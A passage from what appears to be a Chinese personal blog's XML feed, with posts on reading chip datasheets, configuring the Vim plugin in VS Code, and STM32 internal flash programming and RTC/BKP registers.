title="数据手册怎么看"></a>数据手册怎么看</h2><p>一般我们只需要关注数据手册中的：</p><ul><li>第二章，规格说明。这一章的主要作用是给原理图的绘制提供参考和帮助有</li><li>第三章，引脚定义。这一涨啊主要也是对于原理图的绘制有作用</li><li>第五章，电气特性。这个主要是对于各引脚可以承受的电压范围，各种时序之间的时间长短设置。</li></ul><p><strong>需要注意的是，上面的章节数可能随着不同的芯片而不同</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402260015810.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://mp.weixin.qq.com/s/XAM3G57q2F1J60Za8K8iIg">https://mp.weixin.qq.com/s/XAM3G57q2F1J60Za8K8iIg</a><br><br><a href="https://murata.eetrend.com/article/2019-09/1003054.html">https://murata.eetrend.com/article/2019-09/1003054.html</a><br><br><a href="https://ez.analog.com/cn/other/f/forum/96956/thread">https://ez.analog.com/cn/other/f/forum/96956/thread</a><br></p><p><a href="https://blog.csdn.net/Creative_Team/article/details/80006705?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7">STM32F1 系列单片机硬件设计方法</a><br><br><a href="https://cedar-renjun.github.io/2015/12/12/STM32-Hardware-Design/">STM32 硬件设计</a><br><br><a href="http://blog.chinaunix.net/uid-24219701-id-4081961.html">STM32 时钟系统</a><br><br>AN2586 应用笔记-STM32F10xxx 硬件开发使用入门》<br><br>AN2867 应用笔记-ST 微控制器振荡器电路设计指南》<br></p><p><a href="https://blog.csdn.net/pl0020/article/details/119354772">https://blog.csdn.net/pl0020/article/details/119354772</a></p><p><a href="https://blog.csdn.net/FourLeafCloverLLLS/article/details/124448986">JTAG和SWD调试接口</a></p>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在vscode中使用vim</title>
    <link href="/2024/02/17/%E5%9C%A8vscode%E4%B8%AD%E4%BD%BF%E7%94%A8vim/"/>
    <url>/2024/02/17/%E5%9C%A8vscode%E4%B8%AD%E4%BD%BF%E7%94%A8vim/</url>
    
    <content type="html"><![CDATA[<p>如何<code>vscode</code>中使用<code>vim</code>插件</p><span id="more"></span> <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如何在vscode中使用vim模式进行输入，这是我在学习了vim之后就在想的问题。现在我了解到了vscode中的vim插件可以实现这个功能，但是需要对于vscode原有的快捷键进行大改，因为原来的快捷键和vim自带的快捷键是冲突的。所以我在网络上收集了一些vim模式下的快捷键的设置。记录如下。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接在vscode商店中搜索<code>vim</code>，第一个插件便是需要的插件。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>首先，我们需要在vscode中配置<code>settings.json</code>文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-comment">// 绑定vim前导键</span><br>   <span class="hljs-attr">&quot;vim.leader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;space&gt;&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 启用easymotion插件</span><br>   <span class="hljs-attr">&quot;vim.easymotion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 启用系统粘贴板作为vim寄存器</span><br>   <span class="hljs-attr">&quot;vim.useSystemClipboard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 由vim接管ctrl+any的按键，而不是vscode</span><br>   <span class="hljs-attr">&quot;vim.useCtrlKeys&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 突出显示与当前搜索匹配的所有文本</span><br>   <span class="hljs-attr">&quot;vim.hlsearch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// 普通模式下的非递归按键绑定</span><br>   <span class="hljs-attr">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// 插入模式下的非递归按键绑定</span><br>   <span class="hljs-attr">&quot;vim.insertModeKeyBindings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 命令模式下的非递归按键绑定</span><br>   <span class="hljs-attr">&quot;vim.commandLineModeKeyBindingsNonRecursive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 可视模式下的非递归按键绑定</span><br>   <span class="hljs-attr">&quot;vim.operatorPendingModeKeyBindings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-comment">// 下面定义的按键将交由vscode进行处理，而不是vscode-vim插件</span><br>   <span class="hljs-attr">&quot;vim.handleKeys&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>     <span class="hljs-attr">&quot;&lt;C-a&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>     <span class="hljs-attr">&quot;&lt;C-f&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>   <span class="hljs-punctuation">&#125;</span><br> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>其中的<strong>普通模式下的非递归按键绑定</strong>，<strong>插入模式下的非递归按键绑定</strong>等等是什么含义？</p><p>其实就是可以在这个模式下使用的快捷键映射，如下所示：</p><p>一个简单的例子，在INSERT模式下使用jj退回到NORMAL模式：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;vim.insertModeKeyBindings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;before&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;j&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;j&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;after&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;&lt;Esc&gt;&quot;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>下面的示例将演示如何在NORMAL模式下按下快捷键执行COMMAND的命令，如按下<C-n>后，取消高亮搜索：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;before&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;&lt;C-n&gt;&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;commands&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;:nohl&quot;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>除此之外，你也可以定义在按下一些按键后，调用vscode下的命令API，比如在NORMAL模式下按下<leader>gc后，调用vscode的全局命令：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;vim.normalModeKeyBindingsNonRecursive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;before&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;&lt;leader&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;g&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;commands&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;workbench.action.showCommands&quot;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p><strong>注意！leader键只在代码编辑区域生效，它无法做到全vscode生效。</strong></p><p>针对一些刚接触vscode不久的朋友，可能不知道怎么拿到vscode的热键映射命令，其实你可以从vsocde的键盘快捷键中复制命令ID获得。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402172320844.png"></p><p>复制所得的<code>Copy Command ID</code>就是上面的<code>workbench.action.showCommands</code>等等。</p><p><strong>下面是网络上的快捷键设置方案</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt"> ctrl + g c ： 显示命令面板<br> ctrl + g s ： 打开设置页面<br> ctrl + g k ： 打开热键映射<br> ctrl + g m ： 打开一个目录<br> ctrl + g f ： 打开一个文件<br> ctrl + g h ： 打开最近记录<br> ctrl + g n ： 新建vscode实例<br> ctrl + g q ： 关闭vscode示例<br> ​<br> ctrl + f n ： 新建文件<br> ctrl + f o ： 打开文件<br> ctrl + f e ： 另存为文件<br> ctrl + f s ： 保存文件<br> ctrl + f w ： 保存所有文件<br> ctrl + f q ： 关闭文件<br> ctrl + f a ： 关闭所有文件<br> ​<br> ctrl + n [ ： 切换侧边栏显示状态<br> ctrl + n 1 ： 显示文件资源管理器<br> ctrl + n 2 ： 显示TODO Tree<br> ctrl + n 3 ： 显示全局搜索<br> ctrl + n 4 ： 显示debug<br> ctrl + n 5 ： 显示版本控制<br> ctrl + n 6 ： 显示SQL Tools<br> ctrl + n 7 ： 显示Docker<br> ctrl + n 8 ： 显示测试<br> ctrl + n 9 ： 显示插件商店<br> ​<br> ctrl + p ] ： 切换面板显示状态<br> ctrl + p 1 ： 显示问题<br> ctrl + p 2 ： 显示输出<br> ctrl + p 3 ： 显示终端<br> ctrl + p 4 ： 显示调试控制台<br> ctrl + p 5 ： 显示SQL CONSOLE<br>以下是编辑区域操作控制方案：<br><br> ctrl + q ：关闭当前选项卡或分屏<br> ctrl + e ：聚焦在第一个选项卡中<br> ctrl + , ：切换到上一个选项卡<br> ctrl + . ：切换到下一个选项卡<br> ​<br> ctrl + w s ：拆分一个上下分屏<br> ctrl + w v ：拆分一个左右分屏<br> ​<br> ctrl + w k ：将光标向上移动1屏<br> ctrl + w j ：将光标向下移动1屏<br> ​<br> ctrl + w h ：将光标向左移动1屏<br> ctrl + w l ：将光标向右移动1屏<br> <br>代码控制区域：<br><br> ctrl + h ： 触发帮助提示<br> ctrl + j ： 触发参数提示<br> ctrl + k ： 触发建议提示<br> ctrl + n ： 移动到下一个建议<br> ctrl + p ： 移动到上一个建议<br> tab ： 选择下一个建议<br> enter ： 选择当前建议<br> ​<br> ctrl + alt + l ： 格式化代码（个人习惯）<br> ​<br> ctrl + = ： 放大字体<br> ctrl + - ： 缩小字体<br></code></pre></td></tr></table></figure><h2 id="常用的快捷键"><a href="#常用的快捷键" class="headerlink" title="常用的快捷键"></a>常用的快捷键</h2><p>之前我常用的vscode快捷键变化：</p><p><code>ctrl p</code> &#x3D;&gt; <code>ctrl+g p</code></p><p><code>ctrl b</code> &#x3D;&gt; <code>ctrl+n [</code></p><p><code>ctrl f</code> &#x3D;&gt; <code>ctrl+f f</code></p><p><code>ctrl shift p </code> &#x3D;&gt; <code>ctrl+g c</code></p><p><code>ctrl w </code> &#x3D;&gt; <code>ctrl q</code></p><p><code>ctrl shift e</code> 将光标切换至右边的文件栏</p><p><code>ctrl n [ </code>打开右边的文件栏<br>此外该插件还提供了一些便捷热键：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">gd ： 跳转到函数定义或引用处，搭配<span class="hljs-keyword">cmd</span><span class="language-bash">+i/cmd+o查看源码很方便</span><br>gh ： 触发帮助提示<br>gb ： 开启多光标模式，选中和当前单词相同的单词gd ： 跳转到函数定义或引用处，搭配<span class="hljs-keyword">cmd</span><span class="language-bash">+i/cmd+o查看源码很方便</span><br></code></pre></td></tr></table></figure><h1 id="自带插件"><a href="#自带插件" class="headerlink" title="自带插件"></a>自带插件</h1><p>这个<code>vim</code>插件除开有vim模式还有一些其他的插件功能。</p><h2 id="vim-esaymotion插件"><a href="#vim-esaymotion插件" class="headerlink" title="vim-esaymotion插件"></a>vim-esaymotion插件</h2><p><code>vim-esaymotion</code>插件使用它之前你必须在<code>settings.json</code>中加入下面这一行：</p><p><code>&quot;vim.easymotion&quot;: true,</code>它的作用是通过以下的按键组合，你可以快速的定位到任何你想修改的行中：</p><p><code>&lt;leader&gt;&lt;leader&gt;s&lt;char&gt;</code></p><p><a href="https://wklken.me/posts/2015/06/07/vim-plugin-easymotion.html">详细教程</a></p><h2 id="vim-surround插件"><a href="#vim-surround插件" class="headerlink" title="vim-surround插件"></a>vim-surround插件</h2><p><code>vim-surround</code>插件，如果你想修改、或者删除单引号和双引号，它带给你的体验将是无与伦比的，以下是它的语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ds</span><span class="hljs-symbol">&lt;existing&gt;</span><br><span class="hljs-keyword">cs</span><span class="hljs-symbol">&lt;existing&gt;</span><span class="hljs-symbol">&lt;desired&gt;</span><br></code></pre></td></tr></table></figure><p>示例如下：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"># 删除以下的[]<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] -&gt; ds[<br>​<br># 将以下的[]修改为()<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] -&gt; cs[(<br></code></pre></td></tr></table></figure><p><a href="https://yyq123.github.io/learn-vim/learn-vim-plugin-surround.html">详细教程</a></p><h2 id="vim-commentary插件"><a href="#vim-commentary插件" class="headerlink" title="vim-commentary插件"></a>vim-commentary插件</h2><p><code>vim-commentary</code>插件，该插件能够快速的利用键盘进行行或者块的注释，它内部其实是调用了vscode的注释API：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> ：行注释<br>gCC ：块注释<br></code></pre></td></tr></table></figure><h1 id="自动进行输入法转换"><a href="#自动进行输入法转换" class="headerlink" title="自动进行输入法转换"></a>自动进行输入法转换</h1><p>如果你在INSERT模式下使用中文输入法进行编辑，当ESC到NORMAL模式下后，它将依然保持中文输入法，这会使我们需要频繁的使用ctrl+shift或者cmd+space进行输入法切换，非常麻烦。</p><p>我们可以下载一个<code>im-select</code>插件，其帮助我们自动转换。经过我的使用，只有这个页面下的<code>exe</code>可以用于Windows系统，另外一个<code>wim-mspy</code>无法使用。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>首先将输入法切换至纯英文模式，然后在powershell中执行<code>./im-select</code>得出英文模式下的句柄我的是<code>1033</code>。然后将下面的代码添加至<code>vim</code>插件的<code>settings.json</code>文件中。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><br><span class="hljs-attr">&quot;vim.autoSwitchInputMethod.enable&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;vim.autoSwitchInputMethod.defaultIM&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1033&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;vim.autoSwitchInputMethod.obtainIMCmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;F:\\app\\shurufa-switch\\im-select.exe&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;vim.autoSwitchInputMethod.switchIMCmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;F:\\app\\shurufa-switch\\im-select.exe &#123;im&#125;&quot;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>至此完成</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/430603620">https://zhuanlan.zhihu.com/p/430603620</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的flash</title>
    <link href="/2024/02/14/stm32%E4%B8%AD%E7%9A%84flash/"/>
    <url>/2024/02/14/stm32%E4%B8%AD%E7%9A%84flash/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>flash就是非易失性闪存，一般来说stm32需要外接flash芯片以扩大整个系统的内存大小。</p><p>这里的flash就是指stm32中的内部自带的flash存储，而不是额外的芯片。</p><p>stm32flash一般用来保存程序代码，或者是要求断电不丢失的数据</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402182158675.png"></p><h1 id="flash的模块组织"><a href="#flash的模块组织" class="headerlink" title="flash的模块组织"></a>flash的模块组织</h1><p>在stm32中根据不同的产品容量，有着不同的flash大小。我们主要记载中容量大小的flash。</p><p>下图是中容量大小的flash模块组织，<strong>这个flash的内存组织是需要牢记的</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402150058261.png"></p><p>我们可以知道：</p><ul><li>主存储器就是 <strong>程序存储器</strong></li><li>信息块中的启动程序代码就是 <strong>stm32官方写的bootloader程序，就是系统存储器 和 stm32芯片的id号</strong></li><li>信息块中的用户选择字节就是 <strong>选项字节 或者说选择字节</strong></li><li>闪存存储器接口寄存器就是 flash的管理者，我们通过控制整个东西来控制整个flash，在手册中称之为<strong>闪存编程和擦除控制器(FPEC)</strong></li></ul><p>可以知道flash中可以修改的是 程序存储器、选项字节 <strong>系统存储器是无法修改的</strong></p><h1 id="FPEC模块"><a href="#FPEC模块" class="headerlink" title="FPEC模块"></a>FPEC模块</h1><p>处理闪存的编程和擦除操作，它包括7个32位的寄存器：</p><ul><li><p>FPEC键寄存器(FLASH_KEYR) </p></li><li><p>选择字节键寄存器(FLASH_OPTKEYR) </p></li><li><p>闪存控制寄存器(FLASH_CR) </p></li><li><p>闪存状态寄存器(FLASH_SR) </p></li><li><p>闪存地址寄存器(FLASH_AR) </p></li><li><p>选择字节寄存器(FLASH_OBR) </p></li><li><p>写保护寄存器(FLASH_WRPR)</p></li></ul><p>只要CPU不访问闪存，闪存操作不会延缓CPU的执行。</p><h1 id="选项字节"><a href="#选项字节" class="headerlink" title="选项字节"></a>选项字节</h1><p>选择字节共有8个字节，由用户根据应用的需要配置；例如：可以选择使用硬件模式的看门狗或软件的看门狗。</p><p>在选择字节中每个32位的字被划分为下述格式：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402182151120.png"></p><h1 id="flash编程"><a href="#flash编程" class="headerlink" title="flash编程"></a>flash编程</h1><p>flash上的操作包括：</p><ul><li>页擦除、全擦除</li><li>写数据</li><li>加锁、解锁</li></ul><h2 id="擦除"><a href="#擦除" class="headerlink" title="擦除"></a>擦除</h2><p>flash中有两种方式来擦除，在flash的编程手册中提供了这两种擦除方式的程序过程图：</p><p>页擦除：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402182201649.png"></p><p>全擦除：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402182202387.png"></p><h2 id="读、写数据（主闪存编程）"><a href="#读、写数据（主闪存编程）" class="headerlink" title="读、写数据（主闪存编程）"></a>读、写数据（主闪存编程）</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402182202196.png"></p><p>需要注意：</p><ul><li>对主闪存编程每次可以写入16位，每次非16位的编程都会导致FPEC产生总线错误。</li><li>在写数据之前必须要先解锁falsh</li><li>在读写flash时，任何读写flash的操作都会导致cpu暂停，直至此次闪存结束</li></ul><h2 id="加锁、解锁"><a href="#加锁、解锁" class="headerlink" title="加锁、解锁"></a>加锁、解锁</h2><p><strong>复位后，FPEC模块是被保护的，不能写入FLASH_CR寄存器</strong>；通过写入特定的序列到FLASH_KEYR寄存器可以打开FPEC模块，这个特定的序列是在FLASH_KEYR写入两个键值(KEY1和KEY2，下面的<strong>键值</strong>)；错误的操作序列都会在下次复位前锁死FPEC模块和FLASH_CR寄存器。</p><p>写入错误的键序列还会产生总线错误；</p><p>总线错误发生在第一次写入的不是KEY1，或第一次写入的是KEY1但第二次写入的不是KEY2时；FPEC模块和FLASH_CR寄存器可以由程序设置FLASH_CR寄存器中的LOCK位锁住，这时可以通过在FLASH_KEYR中写入正确的键值对FPEC解锁。</p><h3 id="键值"><a href="#键值" class="headerlink" title="键值"></a>键值</h3><p>共有三个键值：</p><p> RDPRT键 &#x3D; 0x000000A5 </p><p> KEY1 &#x3D; 0x45670123 </p><p> KEY2 &#x3D; 0xCDEF89AB</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的RTC和BKP</title>
    <link href="/2024/02/11/stm32%E4%B8%AD%E7%9A%84RTC%E5%92%8CBKP/"/>
    <url>/2024/02/11/stm32%E4%B8%AD%E7%9A%84RTC%E5%92%8CBKP/</url>
    
    <content type="html"><![CDATA[<h1 id="RTC前置知识"><a href="#RTC前置知识" class="headerlink" title="RTC前置知识"></a>RTC前置知识</h1><h2 id="UNIX时间戳"><a href="#UNIX时间戳" class="headerlink" title="UNIX时间戳"></a>UNIX时间戳</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120014329.png"></p><h2 id="两种标准时间"><a href="#两种标准时间" class="headerlink" title="两种标准时间"></a>两种标准时间</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120014838.png"></p><p>闰秒：从上图可以知道，在UTC设置的<code>9192631770</code>周所用的时间和GMT标准中的<code>1970-1-1-0-0-0</code>一致的。但是由于地球自转速度越来越慢，所以需要通过差一个闰秒来解决这个问题。</p><h2 id="C语言中的时间库"><a href="#C语言中的时间库" class="headerlink" title="C语言中的时间库"></a>C语言中的时间库</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120016377.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120017010.png"></p><h1 id="BKP简介"><a href="#BKP简介" class="headerlink" title="BKP简介"></a>BKP简介</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120040126.png"></p><p>这个BKP实际上就是一组寄存器（备份数据寄存器x(BKP_DRx) (x &#x3D; 1 … 10) ），用于保存数据。其可以电源的来源有<code>VDD</code>引脚和<code>VBAT</code>引脚。当<code>VDD</code>没有电的时候就会换到<code>VBAT</code>引脚，有电的时候就会使用<code>VDD</code>的电源，以减少对于<code>VBAT</code>电源的消耗。</p><p>需要注意的是，<code>TANPER</code>引脚；RTC引脚输出RTC校准时钟、闹钟脉冲、秒脉冲；存储RTC时钟校准寄存器这个三个功能是不常用的功能，最常用的是存储应用数据。</p><h1 id="BKP基本结构"><a href="#BKP基本结构" class="headerlink" title="BKP基本结构"></a>BKP基本结构</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120043197.png"></p><h1 id="BKP相关函数"><a href="#BKP相关函数" class="headerlink" title="BKP相关函数"></a>BKP相关函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_DeInit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//重初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_TamperPinLevelConfig</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> BKP_TamperPinLevel)</span>;<span class="hljs-comment">//设置入侵事件的高低电平有效</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_TamperPinCmd</span><span class="hljs-params">(FunctionalState NewState)</span>;<span class="hljs-comment">//开启防入侵模式</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_ITConfig</span><span 